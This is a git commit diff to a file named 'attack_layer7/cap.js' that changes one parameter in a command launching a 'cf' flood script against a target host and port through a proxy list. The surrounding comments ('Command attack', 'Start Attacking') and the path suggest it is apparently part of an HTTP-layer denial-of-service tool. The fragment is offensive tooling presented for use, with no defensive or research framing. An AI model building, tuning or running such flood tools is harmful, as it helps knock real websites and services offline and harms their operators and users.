98a5ddd279e3a6ffe9062d2a7fbd20201eefc46c
apaple <76417012+apaple@users.noreply.github.com>
2022-12-18 17:25:08 +0700

    Update cap.js

--- attack_layer7/cap.js
+++ attack_layer7/cap.js
@@ -68,7 +68,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cf ${host} ${port} 1000 GET proxy.txt 200`, (error, stdout, stderr) => {
+exec(`node cf ${host} ${port} 750 GET proxy.txt 200`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
